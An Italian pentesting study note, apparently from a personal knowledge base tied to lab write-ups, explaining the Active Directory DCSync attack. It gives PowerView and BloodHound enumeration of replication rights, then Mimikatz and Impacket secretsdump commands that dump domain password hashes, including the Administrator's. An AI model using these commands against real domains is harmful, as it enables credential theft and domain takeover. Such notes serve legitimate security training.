#Privesc_AD 

---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Exploit]]
	1. [[#Mimikatz (Windows)]]
	2. [[#Impacket (Linux)]]

---
---
---
### Introduzione
**DCSync** Ã¨ una tecnica di attacco che consente a un utente con permessi sufficienti di simulare il comportamento di un Domain Controller per richiedere la replica delle password (hash NTLM/Kerberos) direttamente dal[[ğŸ”¡ Glossario#Domain Controller | Domain ControllerÂ°]], tramite il protocollo *Directory Replication Service (DRS)*.

DCSync Ã¨ spesso usato per:

- Dumpare gli hash delle password degli utenti AD, incluso `krbtgt`
- Creare Golden Ticket
- Accedere ad ambienti in modo persistente

---
### Enumerazione
Otteniamo il SID dell'utente in possesso sulla macchina target nel seguente modo:

```
Import-Module .\PowerView.ps1  
whoami /all <- Get SID Current User  
```
  
```
Get-ObjectAcl -Identity "dc=child,dc=bank,dc=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "<SID>"}
```

![[Pasted image 20250929235108.png]]

Se come nell'immagine viene mostrato la proprietÃ  `DS-Replication-Get-Changes-All` allora Ã¨ possibile applicare il DCSync Attack.

Possiamo anche automatizzare il processo con [BloodHound](https://www.kali.org/tools/bloodhound/):

```
bloodhound-python -u 'username' -p 'pass' -ns <rhost> -d <domain-name> -c all
neo4j console
bloodhound
```

---
### Exploit
Con i seguenti metodi otteniamo gli hash dell'utente amministratore.
#### Mimikatz (Windows)

Apri [mimikatz.exe](https://github.com/ParrotSec/mimikatz): 

```
.\mimikatz.exe  
lsadump::dcsync /user:<target>@domain.local
```

![[Pasted image 20250929235320.png]]

#### Impacket (Linux)

```
impacket-secretsdump <DOMAIN>/<USER>@<IP_TARGET> -just-dc-user Administrator
```

ğŸ“šâ€‹ Writeups:
- [[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Sauna| Sauna]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Forest| Forest]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Administrator| Administrator]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Forest| Forest]],
